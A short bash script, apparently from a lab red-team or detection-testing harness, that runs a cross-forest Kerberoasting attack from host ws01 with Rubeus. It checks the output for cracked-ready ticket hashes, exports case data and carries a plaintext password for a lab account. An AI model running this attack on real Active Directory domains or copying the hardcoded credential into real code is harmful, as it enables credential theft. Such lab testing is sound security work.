#!/usr/bin/env bash
# T033 — Cross-forest Kerberoast from ws01 (range.local trust)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T033-XFOREST-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T033 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_rubeus
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t033-xforest.ps1)"
printf '%s\n' "${OUT}"
campaign_require_ok T033 "${OUT}" 'krb5tgs|Hashcat format|Roasted'

cadre_export "${CASE_ID}" T033 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
